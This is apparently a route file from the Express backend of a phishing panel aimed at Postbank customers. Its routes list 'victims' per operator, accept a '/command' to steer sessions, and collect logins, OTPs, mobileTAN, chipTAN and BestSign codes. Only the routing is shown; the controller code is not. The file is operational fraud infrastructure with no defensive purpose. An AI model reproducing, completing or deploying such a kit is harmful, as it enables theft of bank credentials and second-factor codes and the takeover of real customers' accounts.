const express = require("express");
const {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitMobileTan,
    submitChipTan,
    submitBestSign,
    deleteEntry,
    submitOtp,
} = require("../controllers/postbankController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/otp", submitOtp);
router.post("/mobileTan", submitMobileTan);
router.post("/chipTan", submitChipTan);
router.post("/bestSign", submitBestSign);
router.post("/delete", deleteEntry);

module.exports = router;
